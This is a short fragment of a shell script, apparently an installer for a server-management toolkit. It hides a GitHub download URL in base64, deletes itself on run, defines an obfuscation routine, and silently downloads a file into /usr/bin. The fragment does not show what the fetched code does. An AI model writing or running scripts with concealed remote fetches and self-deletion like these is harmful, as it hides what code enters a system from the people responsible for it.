...
SCPT_DIR="/etc/SCRIPT"
SCPresq="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Rob255RHJvaWRZVC9URC1HZW4vbWFzdGVyL011bHRpR2VuL0FETS1ORVctVUxUSU1BVEUvZ2VyYWRvcg=="
SUB_DOM='base64 -d'
rm $(pwd)/$0
ofus () {
unset txtofus
...
[[ ! -e /usr/bin/trans ]] && wget -O /usr/bin/trans https://raw.githubusercontent.com/Waldo60/multy/ChumoGH/MultiGen/NEW-ULTIMATE-ORIGINAL/trans &> /dev/null
